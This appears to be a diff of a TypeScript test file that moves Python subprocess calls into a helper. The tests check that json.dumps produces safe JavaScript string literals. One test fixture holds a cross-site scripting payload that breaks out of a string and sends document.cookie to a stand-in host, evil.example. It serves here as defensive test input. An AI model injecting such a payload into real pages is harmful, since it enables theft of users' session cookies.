@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vitest";
+import { runPythonSnippet, runPythonSnippetSync } from "./python-runner";
 import { execFileSync, spawnSync } from "node:child_process";
 import { mkdtempSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
@@ -87,7 +88,7 @@ name = 'John "JD" Doe'
 target_literal = json.dumps(name, ensure_ascii=True)
 print(target_literal)
 `;
-    const result = spawnSync(PYTHON!, ["-c", body], { encoding: "utf-8" });
+    const result = runPythonSnippet(PYTHON!, body);
     const literal = result.stdout.trim();
     /**
      * A JSON string is a valid JavaScript string literal: the quotes
@@ -106,7 +107,7 @@ import json
 name = '"; fetch("https://evil.example/?c=" + document.cookie); //'
 print(json.dumps(name, ensure_ascii=True))
 `;
-    const result = spawnSync(PYTHON!, ["-c", body], { encoding: "utf-8" });
+    const result = runPythonSnippet(PYTHON!, body);
     const literal = result.stdout.trim();
     // The quotes that would have ended the string are escaped.
     expect(literal).toContain('\\"');
